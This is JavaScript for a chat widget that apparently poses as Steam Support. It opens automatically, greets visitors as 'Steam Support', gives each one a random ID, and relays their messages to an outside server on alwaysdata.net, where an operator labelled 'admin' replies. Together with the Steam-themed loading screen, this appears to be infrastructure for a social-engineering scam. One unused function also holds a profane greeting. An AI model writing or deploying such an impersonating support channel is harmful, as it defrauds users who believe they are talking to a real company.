const toggle = document.getElementById("chat-toggle")
const container = document.getElementById("chat-container")
const close = document.getElementById("chat-close")
const send = document.getElementById("chat-send")
const input = document.getElementById("chat-text")
const messages = document.getElementById("chat-messages")

toggle.onclick = () => container.style.display = "flex"
close.onclick = () => container.style.display = "none"

// async function firstVisit() {
//   const $getFirstime = localStorage.getItem("firstime")

//   //await sendMessageAdmin('Hello this is steam support, how can I help you')


  
// }

async function firstVisit() {
    if (localStorage.getItem('hasVisited') === null) {
        await sendMessageAdmin('Hello, this is Steam Support, how may I help you today?');
        localStorage.setItem('hasVisited', 'true');
    }
}


async function checkVisted() {
  const isFirstVisit = await firstVisit()
  if (isFirstVisit) {
    await sendMessageAdmin('hello motherfucker this is steam support')
    console.log('First visit detected')
  }
}


$('#chat-toggle').click()



$(document).ready(async function() {

  setTimeout(firstVisit, 5000)
})

  

function addMessage(text, type = "user") {

  const msg = document.createElement("div")
  msg.className = `message ${type}`
  msg.innerText = text

  messages.appendChild(msg)
  messages.scrollTop = messages.scrollHeight
}

function fakeBotReply(text) {

  setTimeout(() => {
    addMessage("echo: " + text, "bot")
  }, 600)

}

// function sendMessage() {

//   const text = input.value.trim()

//   if (!text) return

//   addMessage(text, "user")

//   input.value = ""

//   fakeBotReply(text)
// }

// send.onclick = sendMessage

// input.addEventListener("keypress", (e) => {
//   if (e.key === "Enter") sendMessage()
// })

document.querySelectorAll(".suggestion").forEach(btn => {
  btn.onclick = () => {
    addMessage(btn.innerText, "user")
    fakeBotReply(btn.innerText)
  }
})

let lastCount = 0

async function giveRandomID() {
  const user = await getUserId();
  console.log(user);
  return user;
  
}


async function chat() {
  const $user = await giveRandomID()
  //console.log(`Current user: ${$user}`)


  // const r = await fetch(`http://bilat.com:8999/data/${$user}`)

    const r = await fetch(`https://sangasaoten.alwaysdata.net/data/${$user}`)


  const data = await r.json()
  return data
}


// async function sendMessageUser() {
//     const text = input.value.trim()


//     // addMessage(text, "user")
// }

// $('#chat-send').click(function() {
//     sendMessageUser()
// })

async function updateChat() {

  const chatData = await chat()
  const $chat = chatData.data
  const $name = chatData.name

  

  if ($chat.length <= lastCount) return

  const newMessages = $chat.slice(lastCount)

  newMessages.forEach(e => {

    if (e.user === "admin") {
      addMessage(e.msg, "bot")
    }

    if (e.user === $name) {
      addMessage(e.msg, "user")
    }

  })

  lastCount = $chat.length
}

setInterval(updateChat, 1500)

async function newUser() {

const $getUser = localStorage.getItem("username")


   
fetch("https://sangasaoten.alwaysdata.net/data/", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    name: $getUser,
    timestamp: Math.floor(Date.now()/1000).toString(),
    user: $getUser,
    status: 'new'
  })
});



}


async function sendMessageAdmin(txt) {

const $getUser = localStorage.getItem("username")


   
fetch("https://sangasaoten.alwaysdata.net/data/", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    name: $getUser,
    timestamp: Math.floor(Date.now()/1000).toString(),
    user: 'admin',
    msg: txt
  })
});
    if (!txt) return


}





async function sendMessageUser(txt) {

const $getUser = localStorage.getItem("username")


   
fetch("https://sangasaoten.alwaysdata.net/data/", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    name: $getUser,
    timestamp: Math.floor(Date.now()/1000).toString(),
    user: $getUser,
    msg: txt
  })
});
    if (!txt) return


}

$('#chat-send').click( function() {

    if ($('#chat-text').val().trim() === '') {
      return
    }
  
    const text = $('#chat-text').val()
    console.log(text)
    sendMessageUser(text)
    $('#chat-text').val('')
})


input.addEventListener("keypress", (e) => {
  if (e.key === "Enter") $('#chat-send').click()
})
// sendMessageUser('asdjklADSJKLASDJKLASDJKLSDF')


//get random username for a browser

async function getUserId() {

    // check if already stored
    const saved = localStorage.getItem("username");

    if (saved) {
        return saved;
    }

    while (true) {

        const random = Math.floor(1000 + Math.random() * 9000);
        const username = "user" + random;

        try {

            const res = await fetch(`https://sangasaoten.alwaysdata.net/data/${username}`);

            // if server says user doesn't exist
            if (!res.ok) {

                localStorage.setItem("username", username);
                return username;

            }

            const data = await res.text();

            if (!data || data === "null" || data === "[]") {

                localStorage.setItem("username", username);
                return username;

            }

        } catch (err) {

            // if request fails, assume available
            localStorage.setItem("username", username);
            return username;

        }

    }
}



// async function giveRandomID() {
//   const user = await getUserId();

//   console.log(user);
// }

// giveRandomID();


//lazy loading

//  $('.calculator-background').hide()
$('.steamloading').fadeOut(4000)
$('.calculator-background').delay(2000).fadeIn()
$('#chat-widget').delay(2000).fadeIn()

